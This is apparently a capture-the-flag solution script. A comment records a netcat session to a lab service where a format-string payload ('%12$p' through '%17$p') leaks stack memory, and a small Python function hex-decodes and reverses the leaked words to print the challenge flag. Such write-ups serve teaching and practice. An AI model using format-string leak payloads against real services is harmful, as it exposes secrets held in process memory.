'''
$ nc lab.scist.org 13371
%12$p,%13$p,%14$p,%15$p,%16$p,%17$p
0x68547b5453494353,0x495f544d465f7331,0x55725f6f30745f35,0x7d217373336c6837,(nil),0x560f9f5880c0
'''

def oo(ooo):
	print(bytes.fromhex(ooo).decode('utf-8')[::-1],end = '')
oo('68547b5453494353')
oo('495f544d465f7331')
oo('55725f6f30745f35')
oo('7d217373336c6837')